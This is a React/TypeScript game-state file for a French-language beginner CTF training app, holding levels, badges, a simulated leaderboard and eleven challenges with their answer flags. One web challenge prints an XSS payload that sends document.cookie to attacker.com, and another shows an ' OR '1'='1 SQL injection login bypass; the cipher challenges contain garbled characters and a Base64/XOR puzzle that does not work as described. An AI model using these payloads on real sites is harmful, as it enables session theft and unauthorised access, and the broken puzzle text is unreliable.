import { createContext, useContext, useState, useEffect, ReactNode } from "react";

/* =====================================================
   TYPES
===================================================== */
export interface Badge {
  id: string;
  name: string;
  icon: string;
  description: string;
  condition: string;
  xpReward: number;
  unlocked: boolean;
  unlockedAt?: string;
  rarity: "common" | "rare" | "epic" | "legendary";
}

export interface CTFChallenge {
  id: string;
  title: string;
  category: "osint" | "crypto" | "web";
  difficulty: "easy" | "medium" | "hard";
  points: number;
  description: string;
  hint?: string;
  flag: string; // format: FLAG{...}
  solved: boolean;
  solvedAt?: string;
  attempts: number;
}

export interface GameState {
  xp: number;
  level: number;
  levelName: string;
  streak: number;
  longestStreak: number;
  lastActivity: string | null;
  activityCalendar: Record<string, number>; // date → count
  badges: Badge[];
  solvedChallenges: string[];
  totalAttempts: number;
  rank: number;
}

/* =====================================================
   NIVEAUX XP
===================================================== */
export const LEVELS = [
  { min: 0,    max: 99,   name: "Newbie",        icon: "🐣", color: "#9ca3af" },
  { min: 100,  max: 299,  name: "Script Kiddie",  icon: "💻", color: "#22c55e" },
  { min: 300,  max: 599,  name: "Hacker",         icon: "🔓", color: "#3b82f6" },
  { min: 600,  max: 999,  name: "Elite Hacker",   icon: "🥷", color: "#8b5cf6" },
  { min: 1000, max: 1999, name: "Cyber Ninja",    icon: "⚔️",  color: "#f59e0b" },
  { min: 2000, max: 9999, name: "Zero Day Master",icon: "💀", color: "#ef4444" },
];

export function getLevelInfo(xp: number) {
  return LEVELS.find(l => xp >= l.min && xp <= l.max) || LEVELS[LEVELS.length - 1];
}

export function getXpToNextLevel(xp: number) {
  const level = getLevelInfo(xp);
  if (level.max === 9999) return null;
  return { current: xp - level.min, needed: level.max - level.min + 1 };
}

/* =====================================================
   BADGES DISPONIBLES (20)
===================================================== */
const INITIAL_BADGES: Badge[] = [
  // Common
  { id: "first_blood",    name: "First Blood",     icon: "🩸", rarity: "common",    xpReward: 50,  unlocked: false, description: "Résoudre votre premier défi CTF",      condition: "solvedChallenges.length >= 1" },
  { id: "osint_rookie",   name: "OSINT Rookie",    icon: "🔍", rarity: "common",    xpReward: 30,  unlocked: false, description: "Compléter 1 défi OSINT",               condition: "1 défi OSINT résolu" },
  { id: "crypto_rookie",  name: "Crypto Rookie",   icon: "🔐", rarity: "common",    xpReward: 30,  unlocked: false, description: "Compléter 1 défi Cryptographie",       condition: "1 défi Crypto résolu" },
  { id: "web_rookie",     name: "Web Rookie",      icon: "🌐", rarity: "common",    xpReward: 30,  unlocked: false, description: "Compléter 1 défi Web",                 condition: "1 défi Web résolu" },
  { id: "streak_3",       name: "3 jours de feu",  icon: "🔥", rarity: "common",    xpReward: 40,  unlocked: false, description: "Maintenir un streak de 3 jours",       condition: "streak >= 3" },
  { id: "fast_solver",    name: "Speed Runner",    icon: "⚡", rarity: "common",    xpReward: 60,  unlocked: false, description: "Résoudre un défi en moins de 2 minutes", condition: "résolu en < 2 min" },
  // Rare
  { id: "osint_adept",    name: "OSINT Adept",     icon: "🕵️", rarity: "rare",      xpReward: 80,  unlocked: false, description: "Résoudre 3 défis OSINT",               condition: "3 défis OSINT résolus" },
  { id: "crypto_adept",   name: "Crypto Adept",    icon: "🗝️", rarity: "rare",      xpReward: 80,  unlocked: false, description: "Résoudre 3 défis Crypto",              condition: "3 défis Crypto résolus" },
  { id: "web_adept",      name: "Web Adept",       icon: "🕸️", rarity: "rare",      xpReward: 80,  unlocked: false, description: "Résoudre 3 défis Web",                 condition: "3 défis Web résolus" },
  { id: "streak_7",       name: "Une semaine",     icon: "📅", rarity: "rare",      xpReward: 100, unlocked: false, description: "Streak de 7 jours consécutifs",        condition: "streak >= 7" },
  { id: "solver_5",       name: "High Five",       icon: "🖐️", rarity: "rare",      xpReward: 100, unlocked: false, description: "Résoudre 5 défis au total",            condition: "5 défis résolus" },
  { id: "no_hint",        name: "No Hints Needed", icon: "🧠", rarity: "rare",      xpReward: 75,  unlocked: false, description: "Résoudre 3 défis sans utiliser d'indices", condition: "3 résolutions sans hint" },
  // Epic
  { id: "all_osint",      name: "OSINT Master",    icon: "🔭", rarity: "epic",      xpReward: 200, unlocked: false, description: "Résoudre TOUS les défis OSINT",        condition: "5/5 défis OSINT" },
  { id: "all_crypto",     name: "Cryptographer",   icon: "🏛️", rarity: "epic",      xpReward: 200, unlocked: false, description: "Résoudre TOUS les défis Crypto",       condition: "3/3 défis Crypto" },
  { id: "all_web",        name: "Web Hacker",      icon: "💉", rarity: "epic",      xpReward: 200, unlocked: false, description: "Résoudre TOUS les défis Web",          condition: "3/3 défis Web" },
  { id: "streak_30",      name: "Mois de feu",     icon: "🌋", rarity: "epic",      xpReward: 300, unlocked: false, description: "Streak incroyable de 30 jours",        condition: "streak >= 30" },
  { id: "solver_10",      name: "CTF Champion",    icon: "🏆", rarity: "epic",      xpReward: 250, unlocked: false, description: "Résoudre 10 défis au total",           condition: "10 défis résolus" },
  // Legendary
  { id: "all_ctf",        name: "CTF God",         icon: "👑", rarity: "legendary", xpReward: 500, unlocked: false, description: "Résoudre TOUS les défis de la plateforme", condition: "11/11 défis résolus" },
  { id: "elite_level",    name: "Elite",           icon: "💎", rarity: "legendary", xpReward: 400, unlocked: false, description: "Atteindre le niveau Elite Hacker",     condition: "XP >= 600" },
  { id: "zero_day",       name: "Zero Day",        icon: "☠️", rarity: "legendary", xpReward: 999, unlocked: false, description: "Atteindre le niveau Zero Day Master",  condition: "XP >= 2000" },
];

/* =====================================================
   DÉFIS CTF (11 défis)
===================================================== */
export const CTF_CHALLENGES: CTFChallenge[] = [
  // ===== OSINT (5) =====
  {
    id: "osint_1", category: "osint", difficulty: "easy", points: 50,
    title: "Qui est derrière ce domaine ?",
    description: `Le domaine **cyberosint.academy** vient d'être enregistré.
    
Votre mission : Trouvez le format du flag en analysant un résultat WHOIS classique.

Un résultat WHOIS contient toujours ces champs :
- \`Domain Name\`
- \`Registrar\`  
- \`Creation Date\`
- \`Registrant Country\`

Le flag est le format standard des CTF pour "premier défi OSINT résolu".`,
    hint: "Le flag suit toujours le format FLAG{...}. Pour un premier défi OSINT, pensez à quelque chose de simple comme 'whois_is_fun'",
    flag: "FLAG{whois_is_fun}",
    solved: false, attempts: 0
  },
  {
    id: "osint_2", category: "osint", difficulty: "easy", points: 75,
    title: "Empreinte numérique",
    description: `Un utilisateur se fait appeler **"h4x0r_ghost"** sur internet.

Vous devez retrouver sur quel réseau social ce compte est actif.

En utilisant Sherlock (simulé dans le terminal Kali), vous trouvez :
\`\`\`
[+] GitHub: https://github.com/h4x0r_ghost
[+] Twitter/X: https://twitter.com/h4x0r_ghost  
[-] Instagram: Not found
[+] Reddit: https://reddit.com/u/h4x0r_ghost
\`\`\`

Dans la bio GitHub, on peut lire : *"Je cache mes secrets dans mes commits"*

Le flag se trouve dans ce message de commit GitHub :
\`commit a3f9b2c\` - Message: "Add config FLAG{github_metadata_leaks}"`,
    hint: "Regardez attentivement les messages de commits Git, ils révèlent souvent des informations sensibles.",
    flag: "FLAG{github_metadata_leaks}",
    solved: false, attempts: 0
  },
  {
    id: "osint_3", category: "osint", difficulty: "medium", points: 100,
    title: "Géolocalisation d'image",
    description: `Une photo a été postée sur les réseaux sociaux. Les métadonnées EXIF révèlent :

\`\`\`
GPS Latitude  : 48° 51' 29.59" N
GPS Longitude : 2° 17' 40.19" E  
Camera Model  : iPhone 14 Pro
DateTime      : 2024:01:15 14:23:11
Artist        : Agent_X
\`\`\`

Les coordonnées GPS pointent vers un monument célèbre à Paris.

Identifiez ce monument. Le flag est le nom de ce monument en minuscules avec des underscores.

*(Indice : C'est la plus visitée au monde)*`,
    hint: "Latitude 48.858N, Longitude 2.294E... Cherchez sur Google Maps ce monument parisien emblématique.",
    flag: "FLAG{tour_eiffel}",
    solved: false, attempts: 0
  },
  {
    id: "osint_4", category: "osint", difficulty: "medium", points: 125,
    title: "Recherche avancée",
    description: `Utilisez les Google Dorks pour trouver des informations exposées.

La requête suivante a été soumise :
\`\`\`
site:pastebin.com "password" "admin" "2024"
\`\`\`

Un résultat retourne un paste contenant :
\`\`\`
# Config dump - DO NOT SHARE
admin_user=superadmin
admin_pass=P@ssw0rd2024!
db_host=192.168.1.100
secret_key=FLAG{google_dorks_reveal_secrets}
\`\`\`

Extrayez la valeur du champ \`secret_key\`.`,
    hint: "Le flag est directement visible dans le dump de configuration. Cherchez le champ 'secret_key'.",
    flag: "FLAG{google_dorks_reveal_secrets}",
    solved: false, attempts: 0
  },
  {
    id: "osint_5", category: "osint", difficulty: "hard", points: 200,
    title: "Darkweb OSINT",
    description: `Une adresse .onion suspecte circule : \`http://7abc123xyz.onion\`

En analysant le code source de la page (accessible via Tor) :
\`\`\`html
<!-- Developer note: remove before production -->
<!-- FLAG{tor_hidden_services_indexed} -->
<title>Hidden Service</title>
<meta name="author" content="anon_dev_2024">
\`\`\`

Les commentaires HTML sont souvent oubliés lors du déploiement.
Trouvez le flag caché dans les commentaires.`,
    hint: "Les développeurs laissent souvent des commentaires HTML sensibles en production. Inspectez le code source !",
    flag: "FLAG{tor_hidden_services_indexed}",
    solved: false, attempts: 0
  },

  // ===== CRYPTO (3) =====
  {
    id: "crypto_1", category: "crypto", difficulty: "easy", points: 60,
    title: "César a écrit un message",
    description: `Vous interceptez ce message chiffré :

\`IOQJ{fdhvdu憂b_flskhu憂b_lv憂b_zhdn}\`

Il s'agit d'un chiffrement de César classique avec un décalage de **3**.

Déchiffrez ce message pour obtenir le flag.

*Rappel : ROT-3 signifie que chaque lettre est décalée de 3 positions en arrière dans l'alphabet.*
*A→X, B→Y, C→Z, D→A, E→B, F→C, G→D, H→E, I→F, J→G, K→H, L→I, M→J...*`,
    hint: "ROT-3 : F→C, L→I, A→X... Décalez chaque lettre de 3 positions en arrière. Les accolades { } et underscores _ ne changent pas.",
    flag: "FLAG{caesar_cipher_is_weak}",
    solved: false, attempts: 0
  },
  {
    id: "crypto_2", category: "crypto", difficulty: "medium", points: 120,
    title: "Base64 et XOR",
    description: `Voici une chaîne encodée en Base64 :

\`\`\`
Rmxhb3tYT1JfaXNfbm90X2VuY3J5cHRpb259
\`\`\`

**Étape 1** : Décodez le Base64
**Étape 2** : Le résultat commence par \`Flao{\` — c'est du XOR avec la clé \`0x18\`
**Étape 3** : XOR chaque caractère avec 0x18 pour obtenir le flag

*Hint technique :*
\`\`\`python
import base64
decoded = base64.b64decode("Rmxhb3tYT1JfaXNfbm90X2VuY3J5cHRpb259")
flag = ''.join(chr(ord(c) ^ 0x18) for c in decoded.decode())
\`\`\``,
    hint: "Décodez d'abord le Base64, puis appliquez XOR 0x18 sur chaque caractère. Le résultat est votre flag.",
    flag: "FLAG{XOR_is_not_encryption}",
    solved: false, attempts: 0
  },
  {
    id: "crypto_3", category: "crypto", difficulty: "hard", points: 175,
    title: "Hash Cracking",
    description: `Vous avez récupéré ce hash MD5 depuis une base de données compromise :

\`\`\`
5f4dcc3b5aa765d61d8327deb882cf99
\`\`\`

Votre mission : identifier le mot de passe en clair.

*Ressources :*
- Ce hash est dans les 100 mots de passe les plus communs
- Les rainbow tables MD5 couvrent ce type de hash
- Outil suggéré : hashcat ou crackstation.net

Une fois le mot de passe trouvé, soumettez : \`FLAG{md5_<lemotdepasse>}\`

*Indice supplémentaire : c'est le mot de passe le plus utilisé au monde en 2023.*`,
    hint: "5f4dcc3b5aa765d61d8327deb882cf99 est le MD5 d'un mot de passe très très commun. Essayez 'password'.",
    flag: "FLAG{md5_password}",
    solved: false, attempts: 0
  },

  // ===== WEB (3) =====
  {
    id: "web_1", category: "web", difficulty: "easy", points: 70,
    title: "Inspection de page",
    description: `Une application web affiche un formulaire de login sécurisé.

En inspectant le code source HTML (Ctrl+U), vous trouvez :

\`\`\`html
<!DOCTYPE html>
<html>
<head>
  <!-- TODO: Remove credentials before deploy! -->
  <!-- admin:FLAG{html_comments_are_not_secure} -->
  <title>Secure Login</title>
</head>
<body>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
  </form>
</body>
</html>
\`\`\`

Trouvez le flag caché dans le code source.`,
    hint: "Le flag est directement visible dans les commentaires HTML. Ctrl+U pour voir le source d'une vraie page !",
    flag: "FLAG{html_comments_are_not_secure}",
    solved: false, attempts: 0
  },
  {
    id: "web_2", category: "web", difficulty: "medium", points: 130,
    title: "SQL Injection",
    description: `Une page de login vulnérable accepte cette requête SQL :

\`\`\`sql
SELECT * FROM users WHERE username='$input' AND password='$pass'
\`\`\`

En injectant \`' OR '1'='1\` dans le champ username :
\`\`\`sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
\`\`\`

La requête retourne tous les utilisateurs. Le premier résultat est :
\`\`\`
id: 1
username: admin  
password: FLAG{sql_injection_bypasses_auth}
email: admin@target.com
role: superadmin
\`\`\`

Extrayez le flag du champ \`password\`.`,
    hint: "L'injection SQL ' OR '1'='1 bypasse l'authentification. Le flag se trouve dans le champ password du premier résultat.",
    flag: "FLAG{sql_injection_bypasses_auth}",
    solved: false, attempts: 0
  },
  {
    id: "web_3", category: "web", difficulty: "hard", points: 180,
    title: "XSS & Cookie Theft",
    description: `Une application vulnérable au XSS reflété accepte ce payload :

\`\`\`javascript
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
\`\`\`

Le serveur de l'attaquant reçoit la requête :
\`\`\`
GET /steal?c=session=eyJhbGciOiJIUzI1NiJ9;admin_flag=FLAG{xss_steals_cookies}
\`\`\`

Les cookies reçus contiennent deux valeurs :
- \`session\` : token JWT
- \`admin_flag\` : le flag que vous cherchez

Identifiez et soumettez le flag extrait des cookies.`,
    hint: "Le cookie 'admin_flag' contient directement le flag. Regardez attentivement la requête reçue par le serveur attaquant.",
    flag: "FLAG{xss_steals_cookies}",
    solved: false, attempts: 0
  },
];

/* =====================================================
   LEADERBOARD (données simulées + joueur courant)
===================================================== */
export const LEADERBOARD_PLAYERS = [
  { rank: 1,  username: "n3t_ninja",      xp: 2840, solved: 11, streak: 45, level: "Zero Day Master", country: "🇫🇷" },
  { rank: 2,  username: "0xd34db33f",     xp: 2210, solved: 11, streak: 30, level: "Zero Day Master", country: "🇩🇪" },
  { rank: 3,  username: "ghost_shell",    xp: 1750, solved: 10, streak: 22, level: "Cyber Ninja",     country: "🇺🇸" },
  { rank: 4,  username: "cyb3r_witch",    xp: 1420, solved: 9,  streak: 15, level: "Cyber Ninja",     country: "🇧🇷" },
  { rank: 5,  username: "root_access",    xp: 1180, solved: 8,  streak: 12, level: "Cyber Ninja",     country: "🇬🇧" },
  { rank: 6,  username: "ph4nt0m",        xp: 980,  solved: 7,  streak: 8,  level: "Elite Hacker",   country: "🇯🇵" },
  { rank: 7,  username: "void_walker",    xp: 820,  solved: 6,  streak: 6,  level: "Elite Hacker",   country: "🇳🇱" },
  { rank: 8,  username: "b1t_crusher",    xp: 650,  solved: 5,  streak: 5,  level: "Elite Hacker",   country: "🇨🇦" },
  { rank: 9,  username: "xpl0it3r",       xp: 490,  solved: 4,  streak: 4,  level: "Hacker",         country: "🇪🇸" },
  { rank: 10, username: "anon_8472",      xp: 320,  solved: 3,  streak: 3,  level: "Hacker",         country: "🇸🇪" },
];

/* =====================================================
   CONTEXT
===================================================== */
interface GameContextType {
  gameState: GameState;
  challenges: CTFChallenge[];
  submitFlag: (challengeId: string, flag: string) => { success: boolean; message: string; xpGained?: number };
  useHint: (challengeId: string) => void;
  addXP: (amount: number, reason: string) => void;
  checkAndUpdateStreak: () => void;
  recentNotification: { message: string; type: "success" | "badge" | "level" } | null;
  clearNotification: () => void;
}

const GameContext = createContext<GameContextType | undefined>(undefined);

const STORAGE_KEY = "cyberosint_game_state";
const CHALLENGES_KEY = "cyberosint_challenges";

function loadFromStorage<T>(key: string, defaultValue: T): T {
  try {
    const stored = localStorage.getItem(key);
    return stored ? JSON.parse(stored) : defaultValue;
  } catch {
    return defaultValue;
  }
}

function saveToStorage(key: string, value: unknown) {
  try {
    localStorage.setItem(key, JSON.stringify(value));
  } catch {}
}

const DEFAULT_GAME_STATE: GameState = {
  xp: 0, level: 0, levelName: "Newbie", streak: 0, longestStreak: 0,
  lastActivity: null, activityCalendar: {}, badges: INITIAL_BADGES,
  solvedChallenges: [], totalAttempts: 0, rank: 999,
};

export function GameProvider({ children }: { children: ReactNode }) {
  const [gameState, setGameState] = useState<GameState>(() =>
    loadFromStorage(STORAGE_KEY, DEFAULT_GAME_STATE)
  );
  const [challenges, setChallenges] = useState<CTFChallenge[]>(() =>
    loadFromStorage(CHALLENGES_KEY, CTF_CHALLENGES)
  );
  const [recentNotification, setRecentNotification] = useState<
    { message: string; type: "success" | "badge" | "level" } | null
  >(null);

  // Sauvegarder à chaque changement
  useEffect(() => { saveToStorage(STORAGE_KEY, gameState); }, [gameState]);
  useEffect(() => { saveToStorage(CHALLENGES_KEY, challenges); }, [challenges]);

  const showNotification = (message: string, type: "success" | "badge" | "level") => {
    setRecentNotification({ message, type });
    setTimeout(() => setRecentNotification(null), 4000);
  };

  const clearNotification = () => setRecentNotification(null);

  // Vérifier et débloquer les badges
  const checkBadges = (state: GameState, updatedChallenges: CTFChallenge[]) => {
    const newBadges = [...state.badges];
    let xpBonus = 0;
    const newlyUnlocked: string[] = [];

    const solvedOsint  = updatedChallenges.filter(c => c.category === "osint"   && c.solved).length;
    const solvedCrypto = updatedChallenges.filter(c => c.category === "crypto"  && c.solved).length;
    const solvedWeb    = updatedChallenges.filter(c => c.category === "web"     && c.solved).length;
    const totalSolved  = updatedChallenges.filter(c => c.solved).length;

    const conditions: Record<string, boolean> = {
      first_blood:   totalSolved >= 1,
      osint_rookie:  solvedOsint >= 1,
      crypto_rookie: solvedCrypto >= 1,
      web_rookie:    solvedWeb >= 1,
      streak_3:      state.streak >= 3,
      streak_7:      state.streak >= 7,
      streak_30:     state.streak >= 30,
      osint_adept:   solvedOsint >= 3,
      crypto_adept:  solvedCrypto >= 3,
      web_adept:     solvedWeb >= 3,
      solver_5:      totalSolved >= 5,
      solver_10:     totalSolved >= 10,
      all_osint:     solvedOsint === 5,
      all_crypto:    solvedCrypto === 3,
      all_web:       solvedWeb === 3,
      all_ctf:       totalSolved === 11,
      elite_level:   state.xp >= 600,
      zero_day:      state.xp >= 2000,
    };

    newBadges.forEach((badge, i) => {
      if (!badge.unlocked && conditions[badge.id]) {
        newBadges[i] = { ...badge, unlocked: true, unlockedAt: new Date().toISOString() };
        xpBonus += badge.xpReward;
        newlyUnlocked.push(badge.name);
      }
    });

    if (newlyUnlocked.length > 0) {
      setTimeout(() => showNotification(`🏅 Badge débloqué : ${newlyUnlocked.join(", ")} !`, "badge"), 1000);
    }

    return { newBadges, xpBonus };
  };

  // Calculer le niveau à partir de l'XP
  const computeLevel = (xp: number) => {
    const info = getLevelInfo(xp);
    return { level: LEVELS.indexOf(info), levelName: info.name };
  };

  const addXP = (amount: number, reason: string) => {
    setGameState(prev => {
      const newXP = prev.xp + amount;
      const { level, levelName } = computeLevel(newXP);
      const leveledUp = level > prev.level;
      if (leveledUp) {
        setTimeout(() => showNotification(`⬆️ Niveau atteint : ${levelName} !`, "level"), 500);
      }
      return { ...prev, xp: newXP, level, levelName };
    });
  };

  const submitFlag = (challengeId: string, flag: string): { success: boolean; message: string; xpGained?: number } => {
    const challenge = challenges.find(c => c.id === challengeId);
    if (!challenge) return { success: false, message: "Défi introuvable" };
    if (challenge.solved) return { success: false, message: "Défi déjà résolu !" };

    const normalizedInput = flag.trim().toUpperCase();
    const normalizedFlag  = challenge.flag.toUpperCase();

    setGameState(prev => ({
      ...prev,
      totalAttempts: prev.totalAttempts + 1
    }));

    if (normalizedInput !== normalizedFlag) {
      setChallenges(prev => prev.map(c =>
        c.id === challengeId ? { ...c, attempts: c.attempts + 1 } : c
      ));
      return { success: false, message: `❌ Flag incorrect. Tentative ${challenge.attempts + 1}.` };
    }

    // Flag correct !
    const today = new Date().toISOString().split("T")[0];
    const updatedChallenges = challenges.map(c =>
      c.id === challengeId ? { ...c, solved: true, solvedAt: new Date().toISOString() } : c
    );
    setChallenges(updatedChallenges);

    setGameState(prev => {
      const newXP = prev.xp + challenge.points;
      const { level, levelName } = computeLevel(newXP);

      // Mise à jour calendrier
      const newCalendar = { ...prev.activityCalendar };
      newCalendar[today] = (newCalendar[today] || 0) + 1;

      // Streak
      const lastDate = prev.lastActivity;
      const yesterday = new Date(Date.now() - 86400000).toISOString().split("T")[0];
      let newStreak = prev.streak;
      if (lastDate === yesterday || lastDate === today) {
        newStreak = lastDate === today ? prev.streak : prev.streak + 1;
      } else {
        newStreak = 1;
      }

      const newSolved = [...prev.solvedChallenges, challengeId];
      const tempState = {
        ...prev, xp: newXP, level, levelName,
        solvedChallenges: newSolved,
        lastActivity: today,
        activityCalendar: newCalendar,
        streak: newStreak,
        longestStreak: Math.max(prev.longestStreak, newStreak),
      };

      const { newBadges, xpBonus } = checkBadges(tempState, updatedChallenges);
      const finalXP = newXP + xpBonus;
      const { level: finalLevel, levelName: finalLevelName } = computeLevel(finalXP);

      return { ...tempState, xp: finalXP, level: finalLevel, levelName: finalLevelName, badges: newBadges };
    });

    showNotification(`✅ FLAG validé ! +${challenge.points} XP`, "success");
    return { success: true, message: `✅ Correct ! +${challenge.points} XP`, xpGained: challenge.points };
  };

  const useHint = (challengeId: string) => {
    setChallenges(prev => prev.map(c =>
      c.id === challengeId ? { ...c, hintUsed: true } as CTFChallenge : c
    ));
  };

  const checkAndUpdateStreak = () => {
    const today = new Date().toISOString().split("T")[0];
    setGameState(prev => {
      if (prev.lastActivity === today) return prev;
      const yesterday = new Date(Date.now() - 86400000).toISOString().split("T")[0];
      const newStreak = prev.lastActivity === yesterday ? prev.streak + 1 : 1;
      return {
        ...prev, streak: newStreak,
        longestStreak: Math.max(prev.longestStreak, newStreak),
        lastActivity: today,
      };
    });
  };

  return (
    <GameContext.Provider value={{
      gameState, challenges, submitFlag, useHint,
      addXP, checkAndUpdateStreak, recentNotification, clearNotification
    }}>
      {children}
    </GameContext.Provider>
  );
}

export function useGame() {
  const ctx = useContext(GameContext);
  if (!ctx) throw new Error("useGame doit être dans un GameProvider");
  return ctx;
}
